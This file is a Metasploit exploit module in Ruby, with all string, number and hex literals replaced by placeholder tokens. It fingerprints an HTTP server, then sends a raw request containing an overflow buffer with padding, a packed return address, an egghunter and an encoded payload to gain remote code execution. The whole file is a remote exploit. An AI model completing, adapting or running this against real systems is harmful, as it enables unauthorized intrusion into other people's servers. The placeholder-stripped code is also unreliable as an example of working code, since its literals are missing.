require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = GoodRanking include Msf :: Exploit :: Remote :: HttpClient def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , ] , <str> = > { <str> = > <int> , <str> = > <str> , <str> = > <str> , } , <str> = > { <str> = > <int> , <str> = > <str> , <str> = > - <int> , } , <str> = > <str> , <str> = > true , <str> = > [ [ <str> , { <str> = > true } ] , [ <str> , { <str> = > <hex> } ] , [ <str> , { <str> = > <hex> } ] ] , <str> = > <int> , <str> = > <str> ) ) register_options ( [ Opt :: RPORT ( <int> ) , OptString . new ( <str> , [ true , <str> , <str> ] ) ] , self . class ) end def exploit targ = target if ( target [ <str> ] ) print_status ( <str> ) resp = send_request_raw ( { <str> = > <str> } , <int> ) if resp . nil? print_status ( <str> ) return Exploit :: CheckCode :: Safe end case resp . body when <str> targ = targets [ <int> ] when <str> targ = targets [ <int> ] else fail_with ( Failure :: NoTarget , <str> ) end end print_status ( <str> targ . name <str> ) exploit_target ( targ ) end def exploit_target ( targ ) egghunter = <str> + <str> + <str> + <str> + <str> + <str> + <str> + <str> print_status ( <str> ) buf = <str> buf << <str> * <int> buf << <str> * <int> buf << <str> buf << [ targ . ret ] . pack ( <str> ) buf << <str> * <int> buf << egghunter buf << <str> * <int> buf << <str> datastore [ <str> ] <str> payload_buf = <str> + make_nops ( <int> ) + <str> + payload . encoded begin connect resp = send_request_raw ( { <str> = > buf + <str> , <str> = > <str> , <str> = > <str> , <str> = > { <str> = > <str> , <str> = > datastore [ <str> ] , } , <str> = > payload_buf } ) rescue :: Rex :: ConnectionError , :: Errno :: ECONNRESET , :: Errno :: EINTR end if not resp . nil? fail_with ( Failure :: Unknown , <str> ) end print_status ( <str> ) print_status ( <str> ) handler disconnect end def check resp = send_request_raw ( { <str> = > <str> } , <int> ) if resp . nil? vprint_status ( <str> ) return Exploit :: CheckCode :: Unknown end if ( resp . body =~ <str> || resp . body =~ <str> || resp . body =~ <str> ) return Exploit :: CheckCode :: Appears end return Exploit :: CheckCode :: Safe end end 
